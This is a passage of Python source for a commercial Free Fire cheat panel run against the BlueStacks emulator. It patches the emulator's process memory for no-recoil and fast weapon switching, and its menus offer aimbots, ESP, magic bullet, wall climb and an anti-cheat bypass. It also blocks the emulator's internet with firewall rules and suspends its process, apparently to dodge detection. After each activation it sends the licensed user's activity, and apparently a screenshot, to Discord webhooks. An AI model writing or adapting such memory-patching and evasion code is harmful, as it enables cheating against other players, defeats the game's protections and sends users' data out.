        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **NO RECOIL (ON)**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')
     
def recoilOFF():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return recoilOFF()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("10 8C BD E8 00 00 00 00 F0 48 2D E9"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("10 8C BD E8 00 00 7A 44 F0 48 2D E9"))     
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **NO RECOIL (OFF)**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')
     

def VQC():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return VQC()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("01 50 00 43 05 00 A0 E1 04 8B BD EC 30 88 BD E8 61 B4 3E 06 B0 A9"), return_multiple = True)
            value2 = pattern_scan_all(proc.process_handle, mkp("1E FF 2F E1 38 10 80 E5 1E FF 2F E1 3C 00 90 E5 1E FF 2F E1 3C 10 80 E5 1E FF 2F E1 44"), return_multiple = True)
            value3 = pattern_scan_all(proc.process_handle, mkp("06 00 A0 E1 18 D0 4B E2 02 8B BD EC 70 8C BD E8"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1 or value2 or value3:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("00"))  
        for addr in value2:
            replace(proc, addr, bytes.fromhex("1E FF 2F E1 38 10 80 E5 1E FF 2F E1 00 00 A0 E3 1E FF 2F E1 3C 10 80 E5 1E FF 2F E1 44"))
        for addr in value3:
            replace(proc, addr, bytes.fromhex("01 00 A0 E3"))   
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **VERY FAST QUICK CHANGE**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')
                    
paused_processes_file = "Warning_Dont_Delete_This_Files_When_Emulator_Paused"  # Nama file untuk menyimpan data proses yang di-pause

def get_hd_player_processes():
    hd_player_processes = []
    for process in psutil.process_iter(['pid', 'name']):
        if 'hd-player.exe' in process.info['name'].lower():
            hd_player_processes.append(process)
    return hd_player_processes

def PAUSE():
    global paused_processes
    hd_player_processes = get_hd_player_processes()
    for process in hd_player_processes:
        process.suspend()
        paused_processes.add(process.pid)  # Menambahkan PID proses yang dijeda ke dalam set
    save_paused_processes()
    print("\033[31m[>] \033[92mEmulator Paused!\033[0m")

def RESUME():
    global paused_processes
    load_paused_processes()
    resumed_processes = set()  # Create a set to store PIDs of successfully resumed processes
    for pid in paused_processes:
        try:
            process = psutil.Process(pid)
            process.resume()
            resumed_processes.add(pid)  # Add the PID to the set of successfully resumed processes
        except psutil.NoSuchProcess:
            pass  # If the process does not exist, ignore it
        except psutil.AccessDenied:
            pass  # If we do not have permission to resume the process, ignore it
    paused_processes -= resumed_processes  # Remove the successfully resumed processes from the paused_processes set
    save_paused_processes()
    if os.path.exists(paused_processes_file):
        os.remove(paused_processes_file)    
    print("\033[31m[>] \033[92mEmulator Resumed!\033[0m")

def save_paused_processes():
    if paused_processes:
        with open(paused_processes_file, 'w') as f:
            f.write(','.join(str(pid) for pid in paused_processes))

def load_paused_processes():
    global paused_processes
    try:
        with open(paused_processes_file, 'r') as f:
            pid_list = f.read().split(',')
            paused_processes = set(int(pid) for pid in pid_list if pid.isdigit())
    except FileNotFoundError:
        paused_processes = set()

# Saat program dimulai, kita perlu memuat data proses yang di-pause (jika ada)
paused_processes = set()  # Menggunakan set untuk menyimpan PIDs proses yang dijeda
load_paused_processes()

def get_hdplayer_path():
    for proc in psutil.process_iter(['pid', 'name']):
        if "HD-Player.exe" in proc.info['name']:
            try:
                proc_exe = proc.exe()
                if os.path.isfile(proc_exe):
                    return os.path.realpath(proc_exe)
            except psutil.AccessDenied:
                pass
    return None

def block_internet(app_path):
    rule_name = "Block Internet HD-Player"
    command = f'netsh advfirewall firewall add rule name="{rule_name}" dir=out action=block program="{app_path}" protocol=any profile=any description="Block Internet for HD Player"'
    subprocess.run(command, shell=True)
    print("\033[31m[>] \033[92mInternet access for Bluestacks is blocked!\033[0m")

def resume_internet(app_path):
    rule_name = "Block Internet HD-Player"
    command = f'netsh advfirewall firewall delete rule name="{rule_name}" program="{app_path}"'
    subprocess.run(command, shell=True)
    print("\033[31m[>] \033[92mInternet access for Bluestacks is resumed!\033[0m")


def BYPASSMENU():
    os.system('cls')
    print("""
=============================== SELECT MENU ======================================
        [B] BLOCK INTERNET                        [R] RESUME INTERNET
        [1] BYPASS EMULATOR PRIME                 [2] BYPASS EMULATOR DIAMOND
                          [PM] Pause  Emulator Manually
                          [RM] Resume Emulator Manually
                          [99] BACK TO MAIN MENU
==================================================================================""")
    pilihan = input("Input Number: ")
    
    if pilihan == 'r' or pilihan == 'R':
        hdplayer_path = get_hdplayer_path()
        if hdplayer_path:
            resume_internet(hdplayer_path)
            input('press ENTER button to Continue...')
            return BYPASSMENU()
        else:
            print("\033[31m[>]\033[0m Bluestacks is not running or could not be detected.")
        input("Press Enter to Continue...")       
    elif pilihan == 'b' or pilihan == 'B':
        hdplayer_path = get_hdplayer_path()
        if hdplayer_path:
            block_internet(hdplayer_path)
            input('press ENTER button to Continue...')
            return BYPASSMENU()
        else:
            print("\033[31m[>]\033[0m Bluestacks is not running or could not be detected.")  
        input("Press Enter to Continue...")
    elif pilihan == 'PM' or pilihan == 'pm':
        PAUSE()
        input("Press Enter to Continue...")
        return BYPASSMENU()
    elif pilihan == 'RM' or pilihan == 'rm':
        RESUME()
        input("Press Enter to Continue...") 
        return BYPASSMENU()                     
    elif pilihan == '1':
        BYPASS_PRIME()
        return BYPASSMENU()
    elif pilihan == '2':
        print("Comingsoon :)")
        input("Press Enter to continue..")
        return BYPASSMENU()
    else:
        pass  

def alert_dialog(message):
   ctypes.windll.user32.MessageBoxW(0, message, "Panel Information", 0x40)

# Contoh penggunaan
alert_dialog("""Last Update: 01/03/2024 00.35 GMT+7

New:
-Added Bypass Emulator Prime (New)
""")

def exit_after(secs):
    time.sleep(secs)
    print("\033[31mThe panel run for a long time, please restart it!\033[0m")
    time.sleep(5)
    os._exit(1)

timer = threading.Thread(target=exit_after, args=[36000])
timer.daemon = True
timer.start()

start_time = time.time()
              
while True:
    time.sleep(1)
    if time.time() - start_time > 36000:
        print("\033[31mThe panel run for a long time, please restart it!\033[0m")
        time.sleep(5)
        os._exit(1)
    os.system("title BOYZGAMES VIP CHEATS")
    os.system("cls")
    os.system("mode con: cols=125 lines=40") #Untuk Mengatur Windows Console
    print(f"""\033[32m        
                                                                                   .
                                     .---.                                        ,O,
              ,,        /     \       ;,,'                                       ,OOO, 
             ;, ;      (  o  o )      ; ;                                  'oooooOOOOOooooo'
               ;,';,,,  \  \/ /      ,; ;                                    `OOOOOOOOOOO`
            ,,,  ;,,,,;;,`   '-,;'''',,,'                                      `OOOOOOO`
           ;,, ;,, ,,,,   ,;  ,,,'';;,,;''';                                   OOOO'OOOO
              ;,,,;    ~~'  '';,,''',,;''''                                   OOO'   'OOO
                                    '''                                      O'         'O        
         :::::::::   ::::::::  :::   ::: :::::::::      :::    :::     :::      ::::::::  :::    ::: ::::::::  
         :+:    :+: :+:    :+: :+:   :+:      :+:       :+:    :+:   :+: :+:   :+:    :+: :+:   :+: :+:    :+: 
         +:+    +:+ +:+    +:+  +:+ +:+      +:+        +:+    +:+  +:+   +:+  +:+        +:+  +:+  +:+        
         +#++:++#+  +#+    +:+   +#++:      +#+         +#++:++#++ +#++:++#++: +#+        +#++:++   +#++:++#++ 
         +#+    +#+ +#+    +#+    +#+      +#+          +#+    +#+ +#+     +#+ +#+        +#+  +#+         +#+ 
         #+#    #+# #+#    #+#    #+#     #+#           #+#    #+# #+#     #+# #+#    #+# #+#   #+# #+#    #+# 
         #########   ########     ###    #########      ###    ### ###     ###  ########  ###    ### ######## \033[0m
                    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    Username   : \033[38;5;173m{keyauthapp.user_data.username}\033[0m
                    Expired    : \033[38;5;207m{datetime.utcfromtimestamp(int(keyauthapp.user_data.expires)).strftime('%Y-%m-%d %H:%M:%S')}\033[0m
                    HWID       : \033[38;5;84m{keyauthapp.user_data.hwid}\033[0m
                    Discord    : \033[95mhttps://discord.gg/KVe9U8m4h6\033[0m
                    Youtube    : \033[31mhttps://www.youtube.com/channel/UCQn6PsW87w12A9ZT5EHorZA\033[0m
                    Updated    : 01/03/2024 00.35 GMT+7
                    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \033[32m
                                              \033[31m[~] FEATURES CHEATS [~]\033[0m\033[32m
                    [0] BYPASS EMULATOR (MENU)    [6]  AIMBOT FOV (Login)       [11] FAST MEDKIT      
                    [1] ESP EXTERNAL (MENU)       [7]  NO RECOIL (Game)         [12] FAST REVIEVE
                    [2] ANTI CHEAT (Login)        [8]  FAST RELOAD              [13] MAGIC BULLET (Menu)
                    [3] AIMBOT HEAD PRO (Game)    [9]  SNIPER AIM (MENU)        [14] IPAD VIEW (Game)
                    [4] AIMBOT NECK (Login)       [10] SNIPER QC  (MENU)        [15] Wall Climb (Game)
                    [5] AIMBOT SCOPE (Menu)       [16] V.FAST QC ALL WP (Lobby) [17] EXIT PANEL
                    [B] BLOCK INTERNET            [R]  RESUME INTERNET""")
    choice = input("Input Number: ")

    if choice == '1':
        os.system('cls')
        print("""
=============================== SELECT MENU ======================================
        [1] ESP CHAMS                        [3] ESP BOX
        [2] ESP NORMAL                       [4] ESP FIX GLOWALL (MENU)
        [Note] Bluestacks Settings: OPENGL | Perfomance | N32
==================================================================================""")
        pilihan = input("Input Number: ")
        if pilihan == '1':
            ESP()
            input("Press Enter to continue...")
        elif pilihan == '2':
            ESPNORMAL()
            input("Press Enter to continue...")
        elif pilihan == '3':
            ESPBOX()
            input("Press Enter to continue...")
        elif pilihan == '4':
            os.system('cls')
            print("""
=============================== MENU ESP FIX =====================================
        [1] ESP CHAMS FIX + ESP NORMAL
        [2] ENABLE VISIBLE CHECK
        [3] DISABLE VISIBLE CHECK
        Note: Play in Bermuda Map Only if you use this ESP, Because If others map have bug!
==================================================================================""")
            menu_esp = input("Input Number: ")
            if menu_esp == '1':
                ESPNORMAL()
                ESPCHAMSVIS()
                input("Press Enter to continue...")
            elif menu_esp == '2':
                VISON()
                input("Press Enter to continue...")
            elif menu_esp == '3':
                VISOFF()
                input("Press Enter to continue...")
                
    elif choice == '2':
        os.system('cls')
        print("""==== ANTI CHEAT MENU ====
     [1] ANTI CHEAT FEATURES
     [2] ANTI CHEAT BYPASS
     [0] BACK TO MAIN MENU""")
        anticheatmenu = input("Type: ")
        if anticheatmenu == '1':
            ANTICHEAT()
        elif anticheatmenu == '2':
            ANTICHEATBP()
    elif choice == '3':
        AIMBOTPRO()
    elif choice == '4':
        AIMNECK()
    elif choice == '5':
        os.system('cls')
        print("""
=============================== SELECT MENU ======================================
        [1] AIMBOT 2X SCOPE                        [3] AIMBOT SNIPER SCOPE
        [2] AIMBOT 4X SCOPE                        [4] ENABLE ALL
==================================================================================
""")
        scopemenu = input("Type: ")
        if scopemenu == '1':
            AIMBOT2X()
        elif scopemenu == '2':
            AIMBOT4X()
        elif scopemenu == '3':
            SNAIMBOT()
        elif scopemenu == '4':
            ALLSCOPEAIMBOT()
    elif choice == '6':
        AIMFOV()
    elif choice == '7':
        os.system('cls')
        print("""==== NO RECOIL ====
     [1] ON
     [2] OFF
     [0] BACK TO MAIN MENU
Note: After activation, Press the Scope Button to see the effect!""")
        norecoilmenu = input("Type: ")
        if norecoilmenu == '1':
            recoilON()
        elif norecoilmenu == '2':
            recoilOFF()
    elif choice == '8':
        soon()
    elif choice == '9':
        AIMSNIPERMENU()
    elif choice == '10':
        QCSNIPERMENU()
    elif choice == '11':
        soon()
    elif choice == '12':
        soon()
    elif choice == '13':
        os.system('cls')
        print("""==== MAGIC BULLET MENU ====
     Note: Activate this features in Lobby!
     [1] MAGIC BULLET (SAFE)
     [2] MAGIC BULLET (BRUTAL)
     [0] BACK TO MAIN MENU""")
        magic_menu = input("Type: ")
        if magic_menu == '1':
            MAGICSAFE()
        elif magic_menu == '2':
            MAGICBRUTAL()
    elif choice == '14':
        os.system('cls')
        print("""==== IPAD VIEW ====
     [1] ON
     [2] OFF
     [0] BACK TO MAIN MENU
Note: After activation, Press the Scope Button to see the effect!""")
        menuipad = input("Type: ")
        if menuipad == '1':
            ipadON()
        elif menuipad == '2':
            ipadOFF()
    elif choice == '15':
        os.system('cls')
        print("""==== WALL CLIMB ====
     [1] ON
     [2] OFF
     [0] BACK TO MAIN MENU
Note: Only Active in match, so activate in match!
if you die, you need activate again!""")   
        menuwall = input("Type: ")
        if menuwall == '1':
            WallClimbON()
        elif menuwall == '2':
            WallClimbOFF()
    elif choice == '16':
        VQC()
    elif choice == '17':
        break        
    elif choice == '0':
        BYPASSMENU()
    elif choice == 'b' or choice == 'B':
        hdplayer_path = get_hdplayer_path()
        if hdplayer_path:
            block_internet(hdplayer_path)
        input("press ENTER To Continue..")    
    elif choice == 'r' or choice == 'R':
        hdplayer_path = get_hdplayer_path()
        if hdplayer_path:
            resume_internet(hdplayer_path) 
        input("press ENTER To Continue..")           
    else:
        os.system('cls')
